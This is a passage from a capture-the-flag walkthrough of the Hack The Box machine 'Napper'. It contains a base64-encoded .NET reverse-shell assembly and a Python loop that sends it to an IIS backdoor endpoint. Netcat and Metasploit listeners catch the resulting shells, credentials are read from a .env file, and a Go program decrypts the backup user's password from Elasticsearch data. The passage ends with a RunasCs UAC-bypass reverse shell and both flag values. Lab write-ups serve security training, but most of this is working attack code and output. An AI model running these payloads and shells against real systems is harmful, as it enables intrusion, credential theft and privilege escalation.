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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAA8DgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

form_field=f"sdafwe3rwe23={requests.utils.quote(payload)}"

for h in hosts:
   url_ssl= f"https://{h}/ews/MsExgHealthCheckd/"

   try:
       status_code = 0
       while status_code != 200:
           r_ssl = requests.post(url_ssl, data=form_field, verify=False, auth=("example", "ExamplePassword"))
           print(f"{url_ssl} : {r_ssl.status_code} {r_ssl.headers}")
           status_code = r_ssl.status_code
           time.sleep(1)
   except KeyboardInterrupt:
       exit()
   except Exception as e:
       print("e")
       pass
```

We run the script and catch the reverse-shell.

```bash
$ python3 run.py
https://napper.htb/ews/MsExgHealthCheckd/ : 200 {'Content-Length': '0', 'Content-Type': 'text/html; charset=utf-8', 'Server': 'Microsoft-IIS/10.0 Microsoft-HTTPAPI/2.0', 'X-Powered-By': 'ASP.NET', 'Date': 'Wed, 15 Nov 2023 11:47:37 GMT'}
e
```

```bash
$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.240] 56498
Microsoft Windows [Version 10.0.19045.3636]
(c) Microsoft Corporation. All rights reserved.

whoami
C:\Windows\system32>whoami
napper\ruben
```

## User flag

```bash
cd C:\Users\ruben\Desktop
C:\Windows\system32>cd C:\Users\ruben\Desktop
dir
C:\Users\ruben\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is CB08-11BF
 Directory of C:\Users\ruben\Desktop
06/09/2023  06:00 AM    <DIR>          .
06/09/2023  06:00 AM    <DIR>          ..
06/07/2023  06:02 AM             2,352 Microsoft Edge.lnk
11/15/2023  03:08 AM                34 user.txt
               2 File(s)          2,386 bytes
               2 Dir(s)   3,420,590,080 bytes free
type user.txt
C:\Users\ruben\Desktop>type user.txt
8f2e8ba9743c1ab501a3007067eebcca
```

## Privilege escalation

Run msfconsole and configuration meterpreter shell. Catch the connection as above:

```bash
$ msfconsole -q

[msf](Jobs:0 Agents:0) >> use windows/shell_reverse_tcp
[msf](Jobs:0 Agents:0) payload(windows/shell_reverse_tcp) >> set LHOST 10.10.16.5
LHOST => 10.10.16.5
[msf](Jobs:0 Agents:0) payload(windows/shell_reverse_tcp) >> set LPORT 4444
LPORT => 4443
[msf](Jobs:1 Agents:0) payload(windows/shell_reverse_tcp) >> exploit
[*] Payload Handler Started as Job 1

[*] Started reverse TCP handler on 10.10.16.5:4444
[msf](Jobs:2 Agents:0) payload(windows/shell_reverse_tcp) >> [*] Command shell session 1 opened (10.10.16.5:4444 -> 10.10.11.240:56844) at 2023-11-15 16:30:39 +0200

[msf](Jobs:2 Agents:1) payload(windows/shell_reverse_tcp) >> sessions

Active sessions
===============

  Id  Name  Type               Information                                                      Connection
  --  ----  ----               -----------                                                      ----------
  1         shell x86/windows  Shell Banner: Microsoft Windows [Version 10.0.19045.3636] -----  10.10.16.5:4444 -> 10.10.11.240:56844 (10.10.11.240)

[msf](Jobs:2 Agents:1) payload(windows/shell_reverse_tcp) >> sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.16.5:4433
[msf](Jobs:3 Agents:1) payload(windows/shell_reverse_tcp) >>
[*] Sending stage (200774 bytes) to 10.10.11.240
[*] Meterpreter session 2 opened (10.10.16.5:4433 -> 10.10.11.240:56845) at 2023-11-15 16:31:26 +0200
[*] Stopping exploit/multi/handler

[msf](Jobs:2 Agents:2) payload(windows/shell_reverse_tcp) >> sessions -l

Active sessions
===============

  Id  Name  Type                     Information                                                      Connection
  --  ----  ----                     -----------                                                      ----------
  1         shell x86/windows        Shell Banner: Microsoft Windows [Version 10.0.19045.3636] -----  10.10.16.5:4444 -> 10.10.11.240:56844 (10.10.11.240)
  2         meterpreter x64/windows  NAPPER\ruben @ NAPPER                                            10.10.16.5:4433 -> 10.10.11.240:56845 (10.10.11.240)

[msf](Jobs:2 Agents:2) payload(windows/shell_reverse_tcp) >> sessions 2
[*] Starting interaction with 2...

(Meterpreter 2)(C:\Windows\system32) > netstat -a

Connection list
===============

    Proto  Local address                    Remote address     State        User  Inode  PID/Program name
    -----  -------------                    --------------     -----        ----  -----  ----------------
    tcp    0.0.0.0:80                       0.0.0.0:*          LISTEN       0     0      4/System
    tcp    0.0.0.0:135                      0.0.0.0:*          LISTEN       0     0      896/svchost.exe
    tcp    0.0.0.0:443                      0.0.0.0:*          LISTEN       0     0      4/System
    tcp    0.0.0.0:445                      0.0.0.0:*          LISTEN       0     0      4/System
    tcp    0.0.0.0:5040                     0.0.0.0:*          LISTEN       0     0      1964/svchost.exe
    tcp    0.0.0.0:7680                     0.0.0.0:*          LISTEN       0     0      4212/svchost.exe
    tcp    0.0.0.0:12345                    0.0.0.0:*          LISTEN       0     0      1364/chisel.exe
    tcp    0.0.0.0:49664                    0.0.0.0:*          LISTEN       0     0      660/lsass.exe
    tcp    0.0.0.0:49665                    0.0.0.0:*          LISTEN       0     0      536/wininit.exe
    tcp    0.0.0.0:49666                    0.0.0.0:*          LISTEN       0     0      1060/svchost.exe
    tcp    0.0.0.0:49667                    0.0.0.0:*          LISTEN       0     0      1580/svchost.exe
    tcp    0.0.0.0:55431                    0.0.0.0:*          LISTEN       0     0      2512/svchost.exe
    tcp    0.0.0.0:56420                    0.0.0.0:*          LISTEN       0     0      652/services.exe
    tcp    10.10.11.240:139                 0.0.0.0:*          LISTEN       0     0      4/System
    tcp    10.10.11.240:55363               10.10.16.12:9001   CLOSE_WAIT   0     0      3768/RunA.exe
    tcp    10.10.11.240:55389               10.10.14.62:4444   CLOSE_WAIT   0     0      5612/RunA.exe
    tcp    10.10.11.240:55414               10.10.14.62:4444   CLOSE_WAIT   0     0      5368/RunA.exe
    tcp    10.10.11.240:56498               10.10.16.5:4444    CLOSE_WAIT   0     0      2316/RunA.exe
    tcp    10.10.11.240:56558               10.10.14.128:1234  CLOSE_WAIT   0     0      5892/powershell.exe
    tcp    10.10.11.240:56578               10.10.14.128:1234  CLOSE_WAIT   0     0      5004/powershell.exe
    tcp    10.10.11.240:56625               10.10.14.62:4444   CLOSE_WAIT   0     0      5172/RunA.exe
    tcp    10.10.11.240:56636               10.10.14.128:1234  ESTABLISHED  0     0      2028/powershell.exe
    tcp    10.10.11.240:56638               10.10.14.62:4444   CLOSE_WAIT   0     0      6052/RunA.exe
    tcp    10.10.11.240:56653               10.10.14.62:4444   CLOSE_WAIT   0     0      3604/RunA.exe
    tcp    10.10.11.240:56684               10.10.14.62:4444   CLOSE_WAIT   0     0      232/RunA.exe
    tcp    10.10.11.240:56702               10.10.14.86:4242   ESTABLISHED  0     0      1864/RunA.exe
    tcp    10.10.11.240:56703               10.10.14.57:4242   SYN_SENT     0     0      5068/revshell.exe
    tcp    10.10.11.240:56704               10.10.14.103:5555  ESTABLISHED  0     0      3588/RunA.exe
    tcp    10.10.11.240:56706               10.10.14.62:4444   CLOSE_WAIT   0     0      5852/RunA.exe
    tcp    10.10.11.240:56737               10.10.14.97:443    CLOSE_WAIT   0     0      7160/powershell.exe
    tcp    10.10.11.240:56749               10.10.16.5:4444    CLOSE_WAIT   0     0      6056/RunA.exe
    tcp    10.10.11.240:56755               10.10.16.5:4444    CLOSE_WAIT   0     0      6580/RunA.exe
    tcp    10.10.11.240:56762               10.10.14.97:443    ESTABLISHED  0     0      3080/powershell.exe
    tcp    10.10.11.240:56777               10.10.16.5:4444    CLOSE_WAIT   0     0      6188/RunA.exe
    tcp    10.10.11.240:56785               10.10.14.62:4444   ESTABLISHED  0     0      6172/RunA.exe
    tcp    10.10.11.240:56787               10.10.14.97:443    ESTABLISHED  0     0      1380/powershell.exe
    tcp    10.10.11.240:56791               10.10.14.97:5555   ESTABLISHED  0     0      6728/nc64.exe
    tcp    10.10.11.240:56804               10.10.14.97:443    ESTABLISHED  0     0      6776/powershell.exe
    tcp    10.10.11.240:56805               10.10.14.97:5555   ESTABLISHED  0     0      6640/nc64.exe
    tcp    10.10.11.240:56807               10.10.14.97:1120   ESTABLISHED  0     0      7052/chisel.exe
    tcp    10.10.11.240:56820               10.10.14.62:8001   ESTABLISHED  0     0      2952/chisel.exe
    tcp    10.10.11.240:56833               10.10.14.97:443    ESTABLISHED  0     0      -
    tcp    10.10.11.240:56842               10.10.14.58:443    ESTABLISHED  0     0      7336/RunA.exe
    tcp    10.10.11.240:56844               10.10.16.5:4444    ESTABLISHED  0     0      7808/RunA.exe
    tcp    10.10.11.240:56845               10.10.16.5:4433    ESTABLISHED  0     0      5576/powershell.exe
    tcp    10.10.11.240:56846               10.10.14.62:8001   TIME_WAIT    0     0      0/[System Process]
    tcp    127.0.0.1:9200                   0.0.0.0:*          LISTEN       0     0      4992/java.exe
    tcp    127.0.0.1:9300                   0.0.0.0:*          LISTEN       0     0      4992/java.exe
    tcp6   :::80                            :::*               LISTEN       0     0      4/System
    tcp6   :::135                           :::*               LISTEN       0     0      896/svchost.exe
    tcp6   :::443                           :::*               LISTEN       0     0      4/System
    tcp6   :::445                           :::*               LISTEN       0     0      4/System
    tcp6   :::7680                          :::*               LISTEN       0     0      4212/svchost.exe
    tcp6   :::12345                         :::*               LISTEN       0     0      1364/chisel.exe
    tcp6   :::49664                         :::*               LISTEN       0     0      660/lsass.exe
    tcp6   :::49665                         :::*               LISTEN       0     0      536/wininit.exe
    tcp6   :::49666                         :::*               LISTEN       0     0      1060/svchost.exe
    tcp6   :::49667                         :::*               LISTEN       0     0      1580/svchost.exe
    tcp6   :::55431                         :::*               LISTEN       0     0      2512/svchost.exe
    tcp6   :::56420                         :::*               LISTEN       0     0      652/services.exe
    udp    0.0.0.0:123                      0.0.0.0:*                       0     0      5936/svchost.exe
    udp    0.0.0.0:5050                     0.0.0.0:*                       0     0      1964/svchost.exe
    udp    0.0.0.0:5353                     0.0.0.0:*                       0     0      1920/svchost.exe
    udp    0.0.0.0:5355                     0.0.0.0:*                       0     0      1920/svchost.exe
    udp    10.10.11.240:137                 0.0.0.0:*                       0     0      4/System
    udp    10.10.11.240:138                 0.0.0.0:*                       0     0      4/System
    udp    10.10.11.240:1900                0.0.0.0:*                       0     0      4604/svchost.exe
    udp    10.10.11.240:50065               0.0.0.0:*                       0     0      4604/svchost.exe
    udp    127.0.0.1:1900                   0.0.0.0:*                       0     0      4604/svchost.exe
    udp    127.0.0.1:50066                  0.0.0.0:*                       0     0      4604/svchost.exe
    udp    127.0.0.1:54773                  0.0.0.0:*                       0     0      2772/svchost.exe
    udp6   :::123                           :::*                            0     0      5936/svchost.exe
    udp6   :::5353                          :::*                            0     0      1920/svchost.exe
    udp6   :::5355                          :::*                            0     0      1920/svchost.exe
    udp6   ::1:1900                         :::*                            0     0      4604/svchost.exe
    udp6   ::1:50064                        :::*                            0     0      4604/svchost.exe
    udp6   fe80::3377:a0d0:71d1:42f4:1900   :::*                            0     0      4604/svchost.exe
    udp6   fe80::3377:a0d0:71d1:42f4:50063  :::*                            0     0      4604/svchost.exe
```

Two services hanging locally on ports 9200 and 9300 are elastic.

Notes in internal:

```bash
(Meterpreter 2)(C:\Windows\system32) > cat "C:\temp\www\internal\content\posts\internal-laps-alpha\.env"
ELASTICUSER=user
ELASTICPASS=DumpPassword\$Here

ELASTICURI=https://127.0.0.1:9200

(Meterpreter 2)(C:\Windows\system32) > portfwd add -l 9200 -p 9200 -r 127.0.0.1
[*] Forward TCP relay created: (local) :9200 -> (remote) 127.0.0.1:9200
```

With the creds from the .env file, we can go elastic.

```bash
$ curl -k -u "user:DumpPassword\$Here" -X GET https://127.0.0.1:9200
{
  "name" : "NAPPER",
  "cluster_name" : "backupuser",
  "cluster_uuid" : "tWUZG4e8QpWIwT8HmKcBiw",
  "version" : {
    "number" : "8.8.0",
    "build_flavor" : "default",
    "build_type" : "zip",
    "build_hash" : "c01029875a091076ed42cdb3a41c10b1a9a5a20f",
    "build_date" : "2023-05-23T17:16:07.179039820Z",
    "build_snapshot" : false,
    "lucene_version" : "9.6.0",
    "minimum_wire_compatibility_version" : "7.17.0",
    "minimum_index_compatibility_version" : "7.0.0"
  },
  "tagline" : "You Know, for Search"
}
```

We get a cid and a blob of elastic:

```bash
$ curl -k -u "user:DumpPassword\$Here" -X GET https://127.0.0.1:9200/seed/_search | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   237  100   237    0     0    326      0 --:--:-- --:--:-- --:--:--   326
{
  "took": 4,
  "timed_out": false,
  "_shards": {
    "total": 1,
    "successful": 1,
    "skipped": 0,
    "failed": 0
  },
  "hits": {
    "total": {
      "value": 1,
      "relation": "eq"
    },
    "max_score": 1,
    "hits": [
      {
        "_index": "seed",
        "_id": "1",
        "_score": 1,
        "_source": {
          "seed": 12120294
        }
      }
    ]
  }
}

$ curl -k -u "user:DumpPassword\$Here" -X GET "https://localhost:9200/user-00001/_search" | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   368  100   368    0     0    334      0  0:00:01  0:00:01 --:--:--   334
{
  "took": 3,
  "timed_out": false,
  "_shards": {
    "total": 1,
    "successful": 1,
    "skipped": 0,
    "failed": 0
  },
  "hits": {
    "total": {
      "value": 1,
      "relation": "eq"
    },
    "max_score": 1,
    "hits": [
      {
        "_index": "user-00001",
        "_id": "-pT83YsB8kppgnucHjK6",
        "_score": 1,
        "_source": {
          "blob": "UncMJA4aBZ4khzH4YkiBsMgsBd3Ix8hXNN0_Tbs5_CveqbcC93lGtolPosdqK6U9fQmFbVo-ZUs=",
          "timestamp": "2023-11-17T07:52:49.52274-08:00"
        }
      }
    ]
  }
}
```

Analyzing the code C:\temp\www\internal\content\posts\internal-laps-alpha\a.exe (with Ghidra), it is found that the parameters of the initial and encrypted large binary objects are in ES. The cmd.exe program is called and the net command is used to change the user's backup password.

Scroll down and see the genkey function, which is linked to the content above main.main. Using the seed parameter as a reference, the number of keys generated is randomly +1.

At the bottom there is main.encrypt, which is the encryption parameter.For AES, base64 is used.

In conjunction with the analysis C:\temp\www\internal\content\posts\internal-laps-alpha\a.exe (with Ghidra) we need to decrypt the data corresponding to ES i.e. base64 of the initial number and user-00001 to get the last password of the backup user and it is random.Write a go program to crack. it.

We write a program that will automatically retrieve parameters from elastic and decode the password:

```go
package main

import (
        "crypto/aes"
        "crypto/cipher"
        "encoding/base64"
        "fmt"
        "log"
        "math/rand"
        "os"
        "strconv"
)

func checkErr(err error) {
        if err != nil {
                log.Fatal(err)
        }
}

func genKey(seed int) (key []byte) {
        rand.Seed(int64(seed))
        for i := 0; i < 0x10; i++ {
                val := rand.Intn(0xfe)
                key = append(key, byte(val+1))
        }
        return
}

func decrypt(seed int, enc []byte) (data []byte) {
        fmt.Printf("Seed: %v\n", seed)
        key := genKey(seed)
        fmt.Printf("Key: %v\n", key)
        iv := enc[:aes.BlockSize]
        fmt.Printf("IV: %v\n", iv)
        data = enc[aes.BlockSize:]

        block, err := aes.NewCipher(key)
        checkErr(err)

        stream := cipher.NewCFBDecrypter(block, iv)
        stream.XORKeyStream(data, data)
        fmt.Printf("Plaintext: %s\n", data)
        return
}

func main() {
        if len(os.Args) != 3 {
                return
        }
        seed, err := strconv.Atoi(os.Args[1])
        checkErr(err)
        enc, err := base64.URLEncoding.DecodeString(os.Args[2])
        checkErr(err)

        decrypt(seed, enc)
}
```

```shell
go run cxk.go 12120294 UncMJA4aBZ4khzH4YkiBsMgsBd3Ix8hXNN0_Tbs5_CveqbcC93lGtolPosdqK6U9fQmFbVo-ZUs=
Seed: 37872930
Key: [217 92 190 247 99 23 97 60 239 123 227 6 169 173 16 186]
IV: [7 27 86 179 181 158 173 51 9 188 143 147 88 224 109 187]
Plaintext: VbHTvlHTzJkDRVaXKITYHMobAWlAldAnyVgJqVvy
```

Then load RunasCs.exe, do a UAC bypass and restore, remember to move fast, the initial value and large binary object will change.

Example:

```shell
.\RunasCs.exe backup VbHTvlHTzJkDRVaXKITYHMobAWlAldAnyVgJqVvy cmd.exe -r 10.10.16.5:4445 --bypass-uac
```

Exploit:

```shell
$ msfconsole -q

[msf](Jobs:0 Agents:0) >>
[msf](Jobs:0 Agents:0) >> use windows/shell_reverse_tcp
[msf](Jobs:0 Agents:0) payload(windows/shell_reverse_tcp) >> set LHOST 10.10.16.5
LHOST => 10.10.16.5
[msf](Jobs:0 Agents:0) payload(windows/shell_reverse_tcp) >> set LPORT 4444
LPORT => 4444
[msf](Jobs:0 Agents:0) payload(windows/shell_reverse_tcp) >> exploit
[*] Payload Handler Started as Job 0

[*] Started reverse TCP handler on 10.10.16.5:4444
[msf](Jobs:1 Agents:0) payload(windows/shell_reverse_tcp) >> [*] Command shell session 1 opened (10.10.16.5:4444 -> 10.10.11.240:58583) at 2023-11-17 17:50:27 +0200

[msf](Jobs:1 Agents:1) payload(windows/shell_reverse_tcp) >> sessions -l

Active sessions
===============

  Id  Name  Type               Information                                                      Connection
  --  ----  ----               -----------                                                      ----------
  1         shell x86/windows  Shell Banner: Microsoft Windows [Version 10.0.19045.3636] -----  10.10.16.5:4444 -> 10.10.11.240:58583 (10.10.11.240)

[msf](Jobs:1 Agents:1) payload(windows/shell_reverse_tcp) >> sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.16.5:4433
[msf](Jobs:2 Agents:1) payload(windows/shell_reverse_tcp) >>
[*] Sending stage (200774 bytes) to 10.10.11.240
[*] Meterpreter session 2 opened (10.10.16.5:4433 -> 10.10.11.240:58586) at 2023-11-17 17:51:59 +0200
[*] Stopping exploit/multi/handler

[msf](Jobs:1 Agents:3) payload(windows/shell_reverse_tcp) >> sessions -l

Active sessions
===============

  Id  Name  Type                     Information                                                      Connection
  --  ----  ----                     -----------                                                      ----------
  1         shell x86/windows        Shell Banner: Microsoft Windows [Version 10.0.19045.3636] -----  10.10.16.5:4444 -> 10.10.11.240:58583 (10.10.11.240)
  2         meterpreter x64/windows  NAPPER\ruben @ NAPPER                                            10.10.16.5:4433 -> 10.10.11.240:58586 (10.10.11.240)
  3         meterpreter x64/windows  NAPPER\ruben @ NAPPER                                            10.10.16.5:4433 -> 10.10.11.240:58594 (10.10.11.240)

[msf](Jobs:1 Agents:3) payload(windows/shell_reverse_tcp) >> sessions 2
[*] Starting interaction with 2...

(Meterpreter 2)(C:\Windows\system32) > cd "C:\Temp"
(Meterpreter 2)(C:\Temp) > upload RunasCs.exe
[*] Uploading  : /root/RunasCs.exe -> RunasCs.exe
[*] Uploaded 50.50 KiB of 50.50 KiB (100.0%): /root/RunasCs.exe -> RunasCs.exe
[*] Completed  : /root/RunasCs.exe -> RunasCs.exe
(Meterpreter 2)(C:\Temp) > shell
Process 6332 created.
Channel 9 created.
Microsoft Windows [Version 10.0.19045.3636]
(c) Microsoft Corporation. All rights reserved.

C:\Temp>.\RunasCs.exe backup VbHTvlHTzJkDRVaXKITYHMobAWlAldAnyVgJqVvy cmd.exe -r 10.10.16.5:4445 --bypass-uac
.\RunasCs.exe backup VbHTvlHTzJkDRVaXKITYHMobAWlAldAnyVgJqVvy cmd.exe -r 10.10.16.5:4445 --bypass-uac

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-39aa6$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 2992 created in background.
```

Catch the shell:

```shell
$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.240] 58662
Microsoft Windows [Version 10.0.19045.3636]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
napper\backup

C:\Windows\system32>cd C:\Users
cd C:\Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is CB08-11BF

 Directory of C:\Users

06/09/2023  12:33 AM    <DIR>          .
06/09/2023  12:33 AM    <DIR>          ..
10/29/2023  12:05 PM    <DIR>          Administrator
06/09/2023  12:38 AM    <DIR>          backup
06/07/2023  11:56 PM    <DIR>          DefaultAppPool
06/07/2023  11:44 PM    <DIR>          internal
06/07/2023  05:37 AM    <DIR>          Public
10/29/2023  12:05 PM    <DIR>          ruben
               0 File(s)              0 bytes
               8 Dir(s)   3,031,638,016 bytes free

C:\Users>cd Administrator\Desktop
cd Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is CB08-11BF

 Directory of C:\Users\Administrator\Desktop

06/09/2023  05:18 AM    <DIR>          .
06/09/2023  05:18 AM    <DIR>          ..
06/08/2023  02:13 AM             2,348 Microsoft Edge.lnk
11/17/2023  07:48 AM                34 root.txt
               2 File(s)          2,382 bytes
               2 Dir(s)   3,034,595,328 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
c9fe7245677c0e42cb826d9d5efd63d4
```